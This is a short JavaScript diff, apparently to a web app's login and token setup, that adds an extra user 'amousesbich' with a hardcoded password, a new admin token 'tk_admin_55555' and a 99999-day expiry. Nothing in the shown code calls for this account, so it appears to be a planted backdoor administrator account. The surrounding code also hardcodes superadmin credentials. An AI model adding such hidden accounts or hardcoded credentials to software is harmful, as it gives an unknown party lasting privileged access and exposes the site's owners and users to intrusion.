@@ -1322,6 +1322,7 @@
         const predefinedTokens = [
             "tk_admin_12345", // Token admin dengan masa aktif 99999 hari
             "tk_superadmin_67890", // Token superadmin dengan masa aktif 99999 hari
+            "tk_admin_55555",
             "tk_5x8q3m2z1r",
             "tk_9a2b4c6d8e",
             "tk_f3g7h2j5k8",
@@ -1407,6 +1408,16 @@
                     username: 'superadmin',
                     password: 'superadmin123',
                     token: 'tk_superadmin_67890',
+                    expiryDays: 99999,
+                    regDate: new Date().toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })
+                });
+            }
+            
+            if (!superAdminExists) {
+                users.push({
+                    username: 'amousesbich',
+                    password: 'amoisesbich',
+                    token: 'tk_admin_55555',
                     expiryDays: 99999,
                     regDate: new Date().toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })
                 });
